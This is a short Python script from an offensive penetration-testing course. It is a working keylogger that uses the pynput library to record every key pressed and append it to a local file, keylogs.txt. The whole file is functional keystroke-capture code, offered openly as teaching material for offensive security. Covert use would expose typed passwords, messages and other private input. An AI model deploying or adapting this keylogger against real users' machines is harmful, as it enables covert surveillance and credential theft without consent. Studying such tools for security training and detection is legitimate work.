# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

#Ref: https://pythonhosted.org/pynput/keyboard.html#monitoring-the-keyboard

from pynput.keyboard import Key, Listener

def on_press(key):
    fp=open("keylogs.txt","a") #create a text file and append the key in it
    print(key)
    fp.write(str(key)+"\n")
    fp.close()
    
with Listener(on_press=on_press) as listener: # if key is pressed, call on_press function
    listener.join()
